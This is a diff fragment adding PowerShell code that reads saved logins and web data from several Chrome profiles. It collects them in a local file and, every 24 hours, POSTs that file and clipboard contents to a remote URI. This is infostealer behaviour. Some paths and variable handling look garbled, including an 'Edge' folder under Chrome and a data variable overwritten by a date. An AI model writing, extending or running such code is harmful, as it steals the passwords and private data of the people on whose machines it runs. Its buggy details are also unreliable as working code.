+        $varper += cat -Path "Google/Chrome\User Data/Profile 8\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile9 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 9/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome/Edge\User Data/Profile 9\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile10 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 10/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome\User Data/Profile 10\Login Data"
+    }else{
+
+    }
+
+    $varper = Get-Date
+
+    $varper | Out-File fff.txt -Append
+
+    if($Stopwatch.Elapsed.Hours -eq 24) {
+        $varper = cat fff.txt 
+        $Response = Invoke-WebRequest -Method Post -URI $URI -body $varper -UseBasicParsing -Timeout 5
+        start-sleep 4
+        $Response = Invoke-WebRequest -Method Post -URI $URI -body $clip -UseBasicParsing -Timeout 5
+        $Stopwatch.Stop()
+        $stopwatch = [System.Diagnostics.Stopwatch]::new()
+        $Stopwatch.Start()
+    } else {
+    }
+    start-sleep 60
 }
